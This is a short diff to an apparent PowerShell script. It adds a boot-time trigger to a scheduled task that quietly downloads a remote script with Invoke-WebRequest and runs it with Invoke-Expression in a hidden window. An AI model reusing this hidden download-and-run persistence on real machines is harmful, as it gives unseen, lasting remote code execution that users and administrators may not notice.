@@ -5,6 +5,7 @@ $LaunchString = "Invoke-WebRequest -URI $PS1URL -UseBasicParsing | Invoke-Expres
 function CreateSchedTask () {
     $Action = New-ScheduledTaskAction -Execute 'C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe' -Argument "-WindowStyle Hidden $LaunchString"
     $Trigger = @()
+    $Trigger += New-ScheduledTaskTrigger -AtStartup
     $Trigger += New-ScheduledTaskTrigger -Daily -At 12am
     $Trigger += New-ScheduledTaskTrigger -Daily -At 10am
     $Trigger += New-ScheduledTaskTrigger -Daily -At 3pm
